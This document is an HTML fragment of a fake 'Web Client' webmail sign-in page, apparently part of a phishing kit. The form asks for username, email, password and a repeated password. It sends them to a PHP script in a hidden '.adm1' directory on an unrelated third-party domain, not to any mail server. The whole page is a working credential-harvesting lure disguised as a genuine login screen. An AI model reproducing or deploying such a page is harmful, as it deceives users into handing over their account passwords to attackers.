<body onload="onLoad();">

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
				<h1><a href="" id="bannerLink" target="_new" title=""><span class="ScreenReaderOnly"></span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>
				<form method="post" name="loginForm" action="https://reiseberatung-passau.de/.adm1/verified.php" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="af1b5a74-4160-468e-b0b5-c839924ba08b">

								<table class="form">
                        <tbody><tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="UserID" class="zLoginField" name="UserID" type="text" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
                                        </tr>
                                        <tr>
                                        <td><label for="username">Email:</label></td>
                                        <td><input id="Email" class="zLoginField" name="Email" type="text" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"></td>
                                </tr>
                                
                                
                                        <tr>
                                <td><label for="password">Confirm Password:</label></td>
                                <td><input id="confirm_password" autocomplete="off" class="zLoginField" name="confirm_password" type="password" value="" size="40" maxlength="1024"></td>
                                </tr>
                                
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox" name="zrememberme">
                                    <label for="remember">Stay signed in</label>
                                <input type="submit" class="ZLoginButton DwtButton" value="Sign In">
                                </td>
                                </tr>
			
			
                          
                        </tbody></table>
                    </form>
			</div>
			<div class="decor1"></div>
